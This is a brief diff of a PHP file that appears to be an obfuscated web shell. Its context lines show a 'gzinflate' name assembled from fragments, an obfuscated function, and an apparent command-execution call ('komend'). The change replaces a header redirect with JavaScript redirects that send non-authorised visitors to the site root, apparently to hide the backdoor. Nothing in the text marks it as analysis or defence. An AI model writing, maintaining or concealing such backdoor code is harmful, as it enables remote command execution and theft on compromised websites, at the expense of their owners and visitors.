@@ -4,7 +4,6 @@
 //Kontol Lu Semua
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
 $domainUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';
-header("Location: $domainUrl");
 
 function Ikg($vHjCLy){
     $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
@@ -384,6 +383,10 @@ htmlspecialchars(komend( $komendnya, $path ));
         </html>
 <?php
 }
+    } else {
+	echo '<script>window.location.href = "'.$domainUrl.'";</script>';
     }
+} else {
+	echo '<script>window.location.href = "'.$domainUrl.'";</script>';
 }
 ?>
